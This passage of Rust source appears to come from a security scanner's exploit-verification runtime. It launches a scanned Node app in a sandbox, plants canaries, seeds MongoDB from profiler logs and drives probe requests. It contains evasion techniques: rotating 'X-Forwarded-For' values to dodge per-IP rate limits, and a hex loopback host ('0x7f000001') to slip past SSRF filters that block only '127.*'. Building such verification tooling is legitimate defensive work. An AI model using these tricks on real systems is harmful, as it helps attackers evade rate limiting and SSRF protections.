//! The execution side of `--verify`: prepare the scanned repo, start the app, drive the derived
//! requests and tear everything down. The default Docker runtime keeps traffic on a private
//! network. `JSS_VERIFY_RUNTIME=local` is for an already-disposable CI sandbox such as a Satori job:
//! it reads the repository Dockerfile's package setup and exposed port, then runs the app as a child
//! process in that same sandbox without requiring nested Docker.

use super::payload::{self, Attempt, Canary, Signal};
use super::plan::Probe;
use super::{ControlObservation, Outcome, Reproduction};
use fs2::FileExt;
use serde::Deserialize;
use std::cell::RefCell;
use std::fs::{File, OpenOptions};
use std::process::{Child, Command, Output, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

/// A monotonic request counter, used to give every driven request a distinct `X-Forwarded-For` so a
/// per-IP rate limiter never throttles the scanner's own probe volume (see [`request_spec`]).
static REQUEST_SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

const BASE_IMAGE: &str = "node:22-slim";
const DEFAULT_NODE_MAJOR: u32 = 22;

const VERIFY_RUN_LABEL_KEY: &str = "ci.satori.jsspector.verify-run";
const DB_IMAGE: &str = "mongo:6";
const DB_ALIASES: [&str; 4] = ["mongo", "mongodb", "db", "database"];
const DB_NAME: &str = "jssverifydb";
const REDIS_IMAGE: &str = "redis:7-alpine";

/// Enable full (level 2) profiling on every application database, so the server records the namespace
/// of every command it receives. Used to discover which collection a read-only sink actually queries.
const ENABLE_PROFILING_SCRIPT: &str = "db.getMongo().getDBNames().forEach(function(n){\
    if(['admin','local','config'].indexOf(n)>=0)return;\
    try{db.getSiblingDB(n).setProfilingLevel(2);}catch(e){}\
  });";

/// A mongosh script that reads the profiler and, for every recorded query whose filter references
/// the per-run sentinel `absent` (the injected field's benign `{$eq:<absent>}` value), inserts one
/// document the query selects: each scalar equality is copied verbatim and the one operator field
/// that references the sentinel is set to a present value, so the later match-all `{$ne:<absent>}`
/// returns it while the `{$eq:<absent>}`/`{$in:[]}` controls do not. A filter field that is itself an
/// object referencing the sentinel is the injected field; other operator fields (an earlier guard's
/// `{verified:true}` does not reference the sentinel, so it is skipped and left off the document,
/// keeping the planted record reachable past the guard). `absent` is 24 hex characters, so it needs
/// no escaping. Collection resolution covers find/count/findAndModify/update/delete/distinct; the
/// profiler is then disabled and its capped log dropped.
fn nosql_lookup_seed_script(absent: &str) -> String {
    format!(
        "var ABSENT='{absent}';var planted=0;\
         db.getMongo().getDBNames().forEach(function(n){{\
           if(['admin','local','config'].indexOf(n)>=0)return;\
           var d=db.getSiblingDB(n);\
           try{{d.getCollection('system.profile').find({{}}).forEach(function(e){{\
             if(!e.command)return;\
             var c=e.command;\
             var coll=c.find||c.count||c.findAndModify||c.findandmodify||c.update||c.delete||c.distinct;\
             if(!coll&&e.ns){{var p=e.ns.split('.');p.shift();coll=p.join('.');}}\
             if(typeof coll!=='string'||coll.indexOf('system.')===0)return;\
             var filter=c.filter||c.query;\
             if(!filter&&c.updates&&c.updates[0])filter=c.updates[0].q;\
             if(!filter&&c.deletes&&c.deletes[0])filter=c.deletes[0].q;\
             if(!filter||typeof filter!=='object')return;\
             if(JSON.stringify(filter).indexOf(ABSENT)<0)return;\
             var doc={{jss_seed:1}};var injected=false;\
             Object.keys(filter).forEach(function(k){{\
               if(k.charAt(0)==='$')return;\
               var v=filter[k];\
               if(v&&typeof v==='object'&&!Array.isArray(v)){{\
                 if(JSON.stringify(v).indexOf(ABSENT)>=0){{\
                   if(k==='_id'){{doc[k]=ObjectId();doc.id=doc[k].toString();\
                     doc.mid='/u/'+doc.id;doc.pl=[];}}\
                   else{{doc[k]='jss_lookup_seed';}}injected=true;}}\
               }}else if(v!==null&&typeof v!=='object'){{doc[k]=v;}}\
             }});\
             if(injected){{try{{d.getCollection(coll).insertOne(doc);planted++;}}catch(e2){{}}}}\
           }});}}catch(e){{}}\
           try{{d.setProfilingLevel(0);}}catch(e){{}}\
           try{{d.getCollection('system.profile').drop();}}catch(e){{}}\
         }});print('planted='+planted);"
    )
}

/// Read the profiler log, seed one document into every (otherwise empty) collection a profiled command
/// targeted — resolving the collection from the command's own field first, falling back to the `ns` —
/// then disable profiling and drop its capped log so only the seeded documents remain.
///
/// The seed document is shaped from the profiled command's own filter so it satisfies the query's
/// non-injected constraints: a plain equality (`{status:"active"}`) is copied verbatim, a range
/// (`{expires:{$gt:now}}`) is seeded with a value that satisfies it (a far-future date or a larger
/// number), and any other operator field (the probed field, which the benign control sends as
/// `{$eq:<absent>}`) is seeded with a neutral sentinel distinct from the injected token. Without this,
/// a query with a second required clause (an unexpired-token window, an owner id) never matches the
/// generic placeholder document and the match-all/match-none differential has nothing to observe. The
/// sentinel and derived values come only from the observed query, so nothing is tied to a target.
const SEED_PROFILED_SCRIPT: &str = "db.getMongo().getDBNames().forEach(function(n){\
    if(['admin','local','config'].indexOf(n)>=0)return;\
    var d=db.getSiblingDB(n);\
    var seeds={};\
    function satisfy(v){\
      if(v&&typeof v==='object'&&!Array.isArray(v)&&!(v instanceof Date)){\
        var ks=Object.keys(v);\
        var isOp=ks.length>0&&ks.every(function(k){return k.charAt(0)==='$';});\
        if(isOp){\
          if('$gt' in v||'$gte' in v){var b=('$gt' in v)?v.$gt:v.$gte;\
            if(b instanceof Date)return new Date(b.getTime()+31536000000);\
            if(typeof b==='number')return b+1000000000;return b;}\
          if('$lt' in v||'$lte' in v){var c2=('$lt' in v)?v.$lt:v.$lte;\
            if(c2 instanceof Date)return new Date(c2.getTime()-31536000000);\
            if(typeof c2==='number')return c2-1000000000;return c2;}\
          if('$in' in v&&Array.isArray(v.$in)&&v.$in.length>0)return v.$in[0];\
          return 'jss_seed';\
        }\
      }\
      return v;\
    }\
    try{d.getCollection('system.profile').find({}).forEach(function(e){\
      var c=null,f=null;\
      if(e.command){c=e.command.find||e.command.findAndModify||e.command.count||\
        e.command.aggregate||e.command.distinct||e.command.update||e.command.delete;\
        f=e.command.filter||e.command.query;}\
      if(!c&&e.ns){var p=e.ns.split('.');p.shift();c=p.join('.');}\
      if(typeof c!=='string'||c.indexOf('system.')===0)return;\
      var doc=seeds[c]||{jss_seed:1};\
      if(f&&typeof f==='object'){Object.keys(f).forEach(function(k){\
        if(k.charAt(0)==='$')return;\
        if(!doc.hasOwnProperty(k)||doc[k]==='jss_seed'){\
          try{doc[k]=satisfy(f[k]);}catch(e2){}}\
      });}\
      seeds[c]=doc;\
    });}catch(e){}\
    Object.keys(seeds).forEach(function(c){\
      try{if(d.getCollection(c).countDocuments({})===0)\
        d.getCollection(c).insertOne(seeds[c]);}catch(e){}\
    });\
    try{d.setProfilingLevel(0);}catch(e){}\
    try{d.getCollection('system.profile').drop();}catch(e){}\
  });";
const REDIS_ALIASES: [&str; 2] = ["redis", "cache"];
const LOCAL_FIXTURE_LOCK: &str = "jsspector-local-verify.lock";
const LOCAL_FIXTURE_MANIFEST: &str = "jsspector-local-fixtures.json";

/// Whether a Docker daemon is reachable. The CLI on some platforms exits 0 even when it cannot
/// connect, so this checks that `docker info` actually printed a server version, not an error.
pub fn available() -> bool {
    if local_runtime_requested() {
        return Command::new("node")
            .arg("--version")
            .output()
            .is_ok_and(|output| output.status.success());
    }
    let Ok(output) = Command::new("docker")
        .args(["info", "--format", "{{.ServerVersion}}"])
        .output()
    else {
        return false;
    };
    let version = String::from_utf8_lossy(&output.stdout);
    let version = version.trim();
    // A real version starts with a digit; an error (or empty) does not.
    output.status.success() && version.bytes().next().is_some_and(|b| b.is_ascii_digit())
}

fn command_available(command: &str) -> bool {
    Command::new(command)
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

fn available_local_port() -> Result<u16, String> {
    let listener = std::net::TcpListener::bind(("127.0.0.1", 0))
        .map_err(|error| format!("reserving a local marker port: {error}"))?;
    listener
        .local_addr()
        .map(|address| address.port())
        .map_err(|error| format!("reading the local marker port: {error}"))
}

fn local_listening_ports() -> Vec<u16> {
    let Ok(output) = Command::new("lsof")
        .args(["-nP", "-iTCP", "-sTCP:LISTEN"])
        .output()
    else {
        return Vec::new();
    };
    let mut ports = String::from_utf8_lossy(&output.stdout)
        .lines()
        .skip(1)
        .filter_map(|line| {
            line.split_whitespace().find_map(|field| {
                field
                    .rsplit_once(':')
                    .and_then(|(_, port)| port.parse::<u16>().ok())
            })
        })
        .collect::<Vec<_>>();
    ports.sort_unstable();
    ports.dedup();
    ports
}

fn local_excluded_ports(
    baseline: &[u16],
    marker: Option<u16>,
    has_db: bool,
    has_redis: bool,
) -> Vec<u16> {
    let mut ports = baseline.to_vec();
    ports.extend(marker);
    ports.extend(has_db.then_some(27017));
    ports.extend(has_redis.then_some(6379));
    ports.sort_unstable();
    ports.dedup();
    ports
}

fn wait_local_service(child: &mut Child, port: u16, name: &str) -> Result<(), String> {
    for _ in 0..80 {
        if let Ok(Some(status)) = child.try_wait() {
            return Err(format!(
                "local {name} exited before it was ready ({status})"
            ));
        }
        if std::net::TcpStream::connect(("127.0.0.1", port)).is_ok() {
            return Ok(());
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
    let _ = child.kill();
    let _ = child.wait();
    Err(format!(
        "local {name} did not listen on port {port} within 20s"
    ))
}

pub(super) fn local_runtime_requested() -> bool {
    std::env::var("JSS_VERIFY_RUNTIME").is_ok_and(|value| value == "local")
}

fn verifier_node_env() -> String {
    std::env::var("JSS_VERIFY_NODE_ENV")
        .ok()
        .filter(|value| {
            !value.is_empty()
                && value.len() <= 64
                && value
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
        })
        .unwrap_or_else(|| "development".to_owned())
}

/// A built image, a private network, a marker service and a running app — one per `scan --verify`
/// run, reused across findings. [`Self::teardown`] removes all of it; [`Drop`] is a backstop.
pub struct Session {
    runtime: Runtime,
    tag: String,
    network: String,
    app: String,
    marker: String,
    db: Option<String>,
    db_env: Vec<(String, String)>,
    redis: Option<String>,
    redis_env: Vec<(String, String)>,
    canary: Canary,
    /// The container port the app listens on: the one we ask for via `PORT`, or, for an app that
    /// fixes its own, the one port it is found listening on (see [`listening_probe_excluding`]).
    port: u16,
    /// Bumped per probe, so one probe's write/service marker never confirms another's.
    nonce: u32,
    /// For an app that drops root at startup (`process.setuid`/`setgid` to a uid/gid read from the
    /// environment), the non-root `uid:gid` to run the container as, so that privilege drop is a
    /// genuine no-op to the identity the process already holds — it ends up as the unprivileged user
    /// it meant to become, with nothing bypassed. `None` when the app performs no privilege drop.
    run_as: Option<(u32, u32)>,
    /// Environment the app's deployment supplies that the sandbox must reproduce for startup to
    /// succeed honestly (the uid/gid/port variables a privilege-dropping app reads). Seeded into
    /// every launch attempt.
    base_env: Vec<RequiredEnv>,
    /// `NODE_PATH` for the launched module when its dependencies are installed in a sibling
    /// application package that bundles it (see [`dependency_provider`]), pointing at that package's
    /// `node_modules` so the module's bare `require(...)` resolves — the same resolution the real app
    /// sets up for its bundled code. `None` when dependencies install in the launch directory itself.
    node_path: Option<String>,
    /// Whether the app uses Node's built-in `node:sqlite`, which requires the `--experimental-sqlite`
    /// runtime flag to load. When set, the flag is added to `NODE_OPTIONS` so the app's own database
    /// initialization succeeds honestly instead of throwing on an unavailable module — the flag is
    /// added only for apps that reference it, so it can never change the startup of an app that does
    /// not. Detected from the app's source (see [`uses_node_sqlite`]).
    node_sqlite: bool,
    /// When set, the synthetic per-request `X-Forwarded-For` (which de-buckets a per-IP rate limiter,
    /// see [`request_spec`]) is suppressed for the next requests. A genuine loopback request carries
    /// no forwarding header; an app that derives trust from the proxy chain (a loopback-only admin
    /// surface that treats any forwarding header as a remote proxy hop) would otherwise read the
    /// verifier's own loopback request as remote and refuse it before the sink. Toggled on only for a
    /// retry that represents the request's true loopback origin, never to grant access the request did
    /// not already have — a real remote attacker still presents a non-loopback socket.
    omit_forwarding: std::cell::Cell<bool>,
    /// Host repo root, used to map startup stack frames under `/app` back to app source.
    root: std::path::PathBuf,
    /// Bare package names the entry module `require`s inside a `try`/`catch` — modules it is written
    /// to tolerate the absence of (an optional native/platform bridge injected only on-device). When
    /// the missing-module stub is engaged, these are *not* stubbed: the launch shim lets their
    /// `require` throw so the app's own `catch` fallback runs, exactly as off-platform. Substituting
    /// an inert function-stub instead would make the guarded value truthy and crash the very fallback
    /// it was meant to avoid (`path.join(getDataPath())` on a non-string). Collected by
    /// [`guarded_bare_requires`]; empty when there is no entry module or it guards nothing.
    guarded_modules: Vec<String>,
    /// The app's launch command as a JSON argv array (the image `CMD`). Kept so a retry that must
    /// first provision a runtime file (a TLS key/cert the app reads before it listens; see
    /// [`missing_tls_material`]) can wrap the launch in a shell that stages that file and then
    /// `exec`s this exact command.
    start_command: String,
    /// Whether the app serves TLS: set when startup needed a self-signed key/cert pair provisioned
    /// so its `https`/`tls` server could bind. The driver then speaks HTTPS to it (see
    /// [`request_spec`]); it also falls back across protocols, so this is an ordering hint, not a
    /// security relaxation of the app.
    tls: bool,
    local_marker_port: Option<u16>,
    local_baseline_ports: Vec<u16>,
    torn_down: bool,
}

enum Runtime {
    Docker,
    Local {
        /// Root of the disposable checkout being verified. This can be wider than `app_root`
        /// when the runnable package lives in a workspace subdirectory but resolves startup
        /// fixtures (for example TLS material) relative to the checkout root.
        checkout_root: std::path::PathBuf,
        app_root: std::path::PathBuf,
        log: std::path::PathBuf,
        command: Vec<String>,
        process: Box<RefCell<Option<Child>>>,
        services: Box<RefCell<Vec<Child>>>,
        service_dirs: Vec<std::path::PathBuf>,
        marker_log: std::path::PathBuf,
        created_files: Vec<std::path::PathBuf>,
        /// Serializes the fixed `/tmp/jss-*` helper namespace across scanner processes. The OS
        /// releases this lock even when a scan is interrupted, allowing the next run to recover
        /// fixtures recorded in the ownership manifest without touching unrelated files.
        _fixture_lock: File,
    },
}

impl Session {
    /// Builds the image from `root` and starts the app and marker service, or returns why it
    /// could not (no start script, build failure, app never listened). The caller turns an `Err`
    /// here into a skip reason for every drivable finding.
    #[cfg(test)]
    pub fn start(root: &std::path::Path) -> Result<Self, String> {
        Self::start_in(root, std::path::Path::new(""), None, &[])
    }

    /// Like [`Self::start`], but launches the package at `app` (relative to `root`, as chosen by
    /// [`app_dir`]) while the whole repo stays in the image, so the app can still import files
    /// outside its own directory. `entry_file` (relative to `root`) is the finding's own source
    /// file, used as the launch target when the app has no launchable manifest but the file is a
    /// self-contained server. `gating_sources` are the source texts of the sink's own module and the
    /// modules it imports: any external-service credential they read by name (a GitHub/API token the
    /// handler requires before it shells out) is reproduced as a configured deployment value so the
    /// sink's credential-gated branch is active (see [`credential_env`]).
    pub fn start_in(
        root: &std::path::Path,
        app_path: &std::path::Path,
        entry_file: Option<&std::path::Path>,
        gating_sources: &[String],
    ) -> Result<Self, String> {
        if local_runtime_requested() {
            return Self::start_local(root, app_path, entry_file, gating_sources);
        }
        let id = run_id();
        let canary = Canary::new(format!("{id}{}", short_rand()))
            .with_callback_host(configured_callback_host()?)
            .with_marker_host(Some(payload::MARKER_HOST.to_owned()));
        let tag = format!("jsspector-verify:{id}");
        let network = format!("jss-verify-net-{id}");
        let app = format!("jss-verify-app-{id}");
        let marker = format!("jss-verify-marker-{id}");
        let port = 3000;

        let app_root = root.join(app_path);
        let db = db_service(&app_root).then(|| format!("jss-verify-db-{id}"));
        let db_env = if db.is_some() {
            db_connection_env()
        } else {
            Vec::new()
        };
        let redis = redis_service(&app_root).then(|| format!("jss-verify-redis-{id}"));
        let redis_env = if redis.is_some() {
            redis_connection_env()
        } else {
            Vec::new()
        };
        let entry_rel = entry_file.and_then(|file| file.strip_prefix(app_path).ok());
        let start_command = start_command(&app_root, entry_rel)
            .ok_or_else(|| "no launchable script or `main` file in package.json".to_owned())?;
        let workdir = container_dir(app_path)
            .ok_or_else(|| format!("unsupported app directory `{}`", app_path.display()))?;
        // Install dependencies where they are declared: the nearest manifest ancestor of the launch
        // directory. A standalone server launched from a manifest-less subdirectory draws its
        // dependencies from an ancestor package, so installing in the launch directory alone would
        // leave `require(...)` unresolved.
        let mut install_rel = install_path(root, app_path);
        // A shared route/server module whose own tree declares none of the packages it imports draws
        // its dependencies from a sibling application package that bundles it at build time (an
        // Electron desktop app, an embedded mobile backend) rather than from an ancestor manifest.
        // Install from that package and expose its `node_modules` through NODE_PATH — the same
        // resolution the real app wires up for its bundled code — or `require(...)` in the mounted
        // module stays unresolved and the app exits before it listens.
        let node_path = entry_file
            .and_then(|module| dependency_provider(root, &install_rel, module))
            .and_then(|provider| {
                let modules = format!("{}/node_modules", container_dir(&provider)?);
                install_rel = provider;
                Some(modules)
            });
        let install_root = root.join(&install_rel);
        let install_workdir = container_dir(&install_rel)
            .ok_or_else(|| format!("unsupported install directory `{}`", install_rel.display()))?;

        let build_env: Vec<(String, String)> =
            db_env.iter().chain(redis_env.iter()).cloned().collect();
        build_image(
            root,
            &app_root,
            &install_root,
            &install_workdir,
            &workdir,
            &tag,
            &canary,
            &start_command,
            port,
            &build_env,
        )?;

        // An internal network: DNS between its members, no route to the internet.
        docker(&["network", "create", "--internal", &network])
            .map_err(|e| format!("could not create the private network: {e}"))?;

        // An app that drops root at startup needs a matching runtime user and the uid/gid/port
        // variables its deployment supplies; discover them from its own source so the privilege drop
        // runs honestly in the sandbox instead of crashing on an unset/undroppable id.
        let (run_as, mut base_env) = match privilege_drop_fixture(&app_root, port) {
            Some(fixture) => (Some(fixture.run_as), fixture.env),
            None => (None, Vec::new()),
        };
        // A sink reached only when the deployment has configured an external-service credential (a
        // GitHub/API token the handler requires before it shells out) is a configuration precondition,
        // not input neutralization: reproduce it honestly by setting that credential to a strong
        // random filler, so the credential-gated branch is live. A random value can only enable a
        // "credential configured" path, never match a real secret or relax an authentication check.
        for cred in credential_env(gating_sources) {
            if base_env.iter().all(|existing| existing.name != cred.name) {
                base_env.push(cred);
            }
        }
        for cfg in config_source_env(gating_sources) {
            if base_env.iter().all(|existing| existing.name != cfg.name) {
                base_env.push(cfg);
            }
        }
        let guarded_modules = guarded_modules(root, entry_file, gating_sources);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] launch plan app={} command={} env={:?} guarded-modules={guarded_modules:?}",
                app_path.display(),
                start_command,
                base_env
                    .iter()
                    .map(|item| (&item.name, &item.value))
                    .collect::<Vec<_>>()
            );
        }

        let mut session = Self {
            runtime: Runtime::Docker,
            tag,
            network,
            app,
            marker,
            db,
            db_env,
            redis,
            redis_env,
            canary,
            port,
            nonce: 0,
            run_as,
            base_env,
            node_path,
            node_sqlite: uses_node_sqlite(root, &app_root),
            omit_forwarding: std::cell::Cell::new(false),
            root: root.to_path_buf(),
            guarded_modules,
            start_command: start_command.clone(),
            tls: false,
            local_marker_port: None,
            local_baseline_ports: Vec::new(),
            torn_down: false,
        };
        if let Err(err) = session.boot() {
            session.teardown();
            return Err(err);
        }
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] launched app={} command={} port={} logs[{}]",
                app_path.display(),
                start_command,
                session.port,
                session.tail_logs(&session.app)
            );
        }
        Ok(session)
    }

    fn start_local(
        root: &std::path::Path,
        app_path: &std::path::Path,
        entry_file: Option<&std::path::Path>,
        gating_sources: &[String],
    ) -> Result<Self, String> {
        let id = run_id();
        let callback_host = configured_callback_host()?;
        let local_marker_port = Some(available_local_port()?);
        // Use the canonical hexadecimal spelling of loopback for the URL driven through the
        // application. Node resolves it to 127.0.0.1, while a verifier still exercises handlers
        // that reject only the literal `127.*` hostname before making the request. The marker
        // remains bound exclusively to loopback, so this never sends verification traffic outside
        // the disposable sandbox.
        let marker_host = local_marker_port.map(|port| format!("0x7f000001:{port}"));
        let canary = Canary::new(format!("{id}{}", short_rand()))
            .with_callback_host(callback_host)
            .with_marker_host(marker_host);
        let app_root = root.join(app_path);
        let app_needs_db = db_service(&app_root);
        let has_local_mongo = command_available("mongod") && command_available("mongosh");
        let ephemeral_db_command = (!has_local_mongo)
            .then(|| local_ephemeral_mongo_next_launch(&app_root))
            .flatten();
        let manages_ephemeral_db = app_needs_db && ephemeral_db_command.is_some();
        let needs_db = app_needs_db && !manages_ephemeral_db && has_local_mongo;
        let needs_redis = redis_service(&app_root);
        if needs_redis && !command_available("redis-server") {
            return Err("the local verifier needs `redis-server` on PATH for this app".to_owned());
        }
        let entry_rel = entry_file.and_then(|file| file.strip_prefix(app_path).ok());
        // Install and build before choosing the launch command. A package whose start script names
        // generated output (`node dist/index.js`) must be evaluated after its `compile`/`build`
        // script has had a chance to create that output; otherwise a fresh checkout incorrectly
        // falls back to hosting one router module while a previously prepared checkout runs the real
        // application.
        let mut install_rel = install_path(root, app_path);
        let node_path = entry_file
            .and_then(|module| dependency_provider(root, &install_rel, module))
            .map(|provider| {
                install_rel = provider.clone();
                root.join(provider)
                    .join("node_modules")
                    .display()
                    .to_string()
            });
        let install_root = root.join(&install_rel);
        prepare_local_app(root, &install_root)?;
        let start_command = if let Some(command) = ephemeral_db_command {
            command
        } else if app_needs_db
            && !has_local_mongo
            && let Some(file) = entry_rel
                .and_then(|path| path.to_str())
                .and_then(|path| package_file(&app_root, path))
            && is_express_factory_module(&app_root.join(&file))
        {
            // Some applications make their production bootstrap wait for MongoDB before opening
            // the HTTP listener, even though the route under test is independent of the database.
            // Mount an exported Express factory through the existing host in that situation. This
            // executes the application's real middleware, route and sink without inventing a DB or
            // changing repository code.
            express_host_command(&file)
        } else {
            start_command(&app_root, entry_rel)
                .ok_or_else(|| "no launchable script or `main` file in package.json".to_owned())?
        };
        let mut local_command: Vec<String> = serde_json::from_str(&start_command)
            .map_err(|error| format!("invalid generated start command: {error}"))?;
        if local_command.is_empty() {
            return Err("generated start command is empty".to_owned());
        }
        for argument in &mut local_command {
            *argument = localize_helper_paths(argument);
        }
        let fixture_lock = acquire_local_fixture_lock()?;
        let created_files = plant_local_files(&canary)?;
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] local fixtures planted count={} canary={} exists={}",
                created_files.len(),
                canary.planted_file(),
                std::path::Path::new(&canary.planted_file()).is_file(),
            );
        }
        let log = std::env::temp_dir().join(format!("jsspector-verify-{id}.log"));
        let marker_log = std::env::temp_dir().join(format!("jsspector-marker-{id}.log"));
        let mut service_dirs = Vec::new();
        if needs_db {
            service_dirs.push(std::env::temp_dir().join(format!("jsspector-mongo-{id}")));
        }
        if needs_redis {
            service_dirs.push(std::env::temp_dir().join(format!("jsspector-redis-{id}")));
        }
        // Every local launch receives a private free port through `PORT`. Applications that hard-code
        // their listener are still discovered by the readiness probe, while platform-host shims and
        // ordinary `process.env.PORT` servers cannot collide with an orphan from an interrupted scan.
        let port = available_local_port()?;
        let (run_as, mut base_env) = match local_privilege_drop_fixture(&app_root, port) {
            Some(fixture) => (Some(fixture.run_as), fixture.env),
            None => (None, Vec::new()),
        };
        for cred in credential_env(gating_sources) {
            if base_env.iter().all(|existing| existing.name != cred.name) {
                base_env.push(cred);
            }
        }
        for cfg in config_source_env(gating_sources) {
            if base_env.iter().all(|existing| existing.name != cfg.name) {
                base_env.push(cfg);
            }
        }
        let guarded_modules = guarded_modules(root, entry_file, gating_sources);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] local launch plan app={} command={} env={:?} db={} redis={} guarded-modules={guarded_modules:?}",
                app_path.display(),
                start_command,
                base_env
                    .iter()
                    .map(|item| (&item.name, &item.value))
                    .collect::<Vec<_>>(),
                needs_db,
                needs_redis,
            );
        }
        let mut session = Self {
            runtime: Runtime::Local {
                checkout_root: root.to_path_buf(),
                app_root,
                log,
                command: local_command,
                process: Box::new(RefCell::new(None)),
                services: Box::new(RefCell::new(Vec::new())),
                service_dirs,
                marker_log,
                created_files,
                _fixture_lock: fixture_lock,
            },
            tag: String::new(),
            network: String::new(),
            app: format!("jss-local-app-{id}"),
            marker: String::new(),
            db: needs_db.then(|| "local-mongo".to_owned()),
            db_env: needs_db.then(local_db_connection_env).unwrap_or_default(),
            redis: needs_redis.then(|| "local-redis".to_owned()),
            redis_env: needs_redis
                .then(local_redis_connection_env)
                .unwrap_or_default(),
            canary,
            port,
            nonce: 0,
            run_as,
            base_env,
            node_path,
            node_sqlite: uses_node_sqlite(root, &root.join(app_path)),
            omit_forwarding: std::cell::Cell::new(false),
            root: root.to_path_buf(),
            guarded_modules,
            start_command: start_command.clone(),
            tls: false,
            local_marker_port,
            local_baseline_ports: Vec::new(),
            torn_down: false,
        };
        session.start_local_services()?;
        session.local_baseline_ports = local_listening_ports();
        session.boot_local()?;
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] local launched app={} command={} port={} logs[{}]",
                app_path.display(),
                start_command,
                session.port,
                session.tail_logs(&session.app)
            );
        }
        Ok(session)
    }

    fn start_local_services(&self) -> Result<(), String> {
        let Runtime::Local {
            services,
            service_dirs,
            marker_log,
            ..
        } = &self.runtime
        else {
            return Err("local sidecars requested for a Docker session".to_owned());
        };
        if let Some(port) = self.local_marker_port {
            let log = std::fs::File::create(marker_log)
                .map_err(|error| format!("creating local marker log: {error}"))?;
            let stderr = log
                .try_clone()
                .map_err(|error| format!("opening local marker log: {error}"))?;
            let mut marker = Command::new("node")
                .arg("/tmp/jss-marker.js")
                .env("JSS_MARKER_PORT", port.to_string())
                .stdout(log)
                .stderr(stderr)
                .spawn()
                .map_err(|error| format!("starting local marker service: {error}"))?;
            wait_local_service(&mut marker, port, "marker")?;
            services.borrow_mut().push(marker);
        }
        let mut directory = service_dirs.iter();
        if self.db.is_some() {
            let dir = directory
                .next()
                .ok_or_else(|| "missing local MongoDB directory".to_owned())?;
            std::fs::create_dir_all(dir)
                .map_err(|error| format!("creating local MongoDB directory: {error}"))?;
            let log = std::fs::File::create(dir.join("mongod.log"))
                .map_err(|error| format!("creating local MongoDB log: {error}"))?;
            let stderr = log
                .try_clone()
                .map_err(|error| format!("opening local MongoDB log: {error}"))?;
            let mut child = Command::new("mongod")
                .args([
                    "--bind_ip",
                    "127.0.0.1",
                    "--port",
                    "27017",
                    "--nounixsocket",
                    "--quiet",
                ])
                .arg("--dbpath")
                .arg(dir)
                .stdout(log)
                .stderr(stderr)
                .spawn()
                .map_err(|error| format!("starting local MongoDB: {error}"))?;
            wait_local_service(&mut child, 27017, "MongoDB")?;
            services.borrow_mut().push(child);
        }
        if self.redis.is_some() {
            let dir = directory
                .next()
                .ok_or_else(|| "missing local Redis directory".to_owned())?;
            std::fs::create_dir_all(dir)
                .map_err(|error| format!("creating local Redis directory: {error}"))?;
            let log = std::fs::File::create(dir.join("redis.log"))
                .map_err(|error| format!("creating local Redis log: {error}"))?;
            let stderr = log
                .try_clone()
                .map_err(|error| format!("opening local Redis log: {error}"))?;
            let mut child = Command::new("redis-server")
                .args([
                    "--bind",
                    "127.0.0.1",
                    "--port",
                    "6379",
                    "--save",
                    "",
                    "--appendonly",
                    "no",
                ])
                .arg("--dir")
                .arg(dir)
                .stdout(log)
                .stderr(stderr)
                .spawn()
                .map_err(|error| format!("starting local Redis: {error}"))?;
            wait_local_service(&mut child, 6379, "Redis")?;
            services.borrow_mut().push(child);
        }
        Ok(())
    }

    fn boot_local(&mut self) -> Result<(), String> {
        let mut env = self.base_env.clone();
        let mut stub_missing_modules = false;
        let mut mongodb_callback_promises = false;
        let mut scratch_dirs = Vec::new();
        let mut cert_files: Vec<String> = Vec::new();
        let mut dotenv_files: Vec<String> = Vec::new();
        let mut generated_config_retry = false;
        let mut next_development_retry = false;
        for attempt in 1..=5 {
            self.run_local_app(
                &env,
                stub_missing_modules,
                mongodb_callback_promises,
                next_development_retry,
                &scratch_dirs,
            )?;
            let err = match self.wait_until_listening() {
                Ok(port) => {
                    self.port = port;
                    restore_local_read_canaries(&self.canary)?;
                    self.seed_db();
                    return Ok(());
                }
                Err(error) => error,
            };
            let mut missing = Vec::new();
            for wanted in required_env(&err)
                .into_iter()
                .chain(config_env(&err, &self.root))
            {
                if env.iter().all(|have| have.name != wanted.name)
                    && missing
                        .iter()
                        .all(|have: &RequiredEnv| have.name != wanted.name)
                {
                    missing.push(wanted);
                }
            }
            let enable_module_stub = !stub_missing_modules && missing_bare_module(&err);
            let enable_mongodb_callback_promises =
                !mongodb_callback_promises && missing_mongodb_collection_promise(&err);
            let new_dir = missing_write_dir(&err).filter(|dir| !scratch_dirs.contains(dir));
            let new_cert = missing_tls_material(&err)
                .filter(|(path, _)| !cert_files.iter().any(|have| have == path));
            let new_dotenv = missing_dotenv_file(&err)
                .filter(|path| !dotenv_files.iter().any(|have| have == path));
            let retry_generated_config = !generated_config_retry && generated_startup_config(&err);
            let next_development_available = match &self.runtime {
                Runtime::Local { app_root, .. } => {
                    next_development_command(app_root, self.port).is_some()
                }
                Runtime::Docker => false,
            };
            let retry_next_development = !next_development_retry
                && missing_next_production_build(&err)
                && next_development_available;
            if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
                eprintln!(
                    "[verify] local startup attempt {attempt} failed; retry mongodb-collections={} module-stub={} generated-config={} next-dev={}",
                    enable_mongodb_callback_promises,
                    enable_module_stub,
                    retry_generated_config,
                    retry_next_development
                );
            }
            if missing.is_empty()
                && !enable_module_stub
                && !enable_mongodb_callback_promises
                && new_dir.is_none()
                && new_cert.is_none()
                && new_dotenv.is_none()
                && !retry_generated_config
                && !retry_next_development
            {
                return Err(err);
            }
            env.extend(missing);
            stub_missing_modules |= enable_module_stub;
            mongodb_callback_promises |= enable_mongodb_callback_promises;
            generated_config_retry |= retry_generated_config;
            next_development_retry |= retry_next_development;
            if let Some(dir) = new_dir {
                scratch_dirs.push(dir);
            }
            if let Some((path, is_key)) = new_cert {
                self.stage_local_tls_file(&path, is_key)?;
                cert_files.push(path);
                self.tls = true;
            }
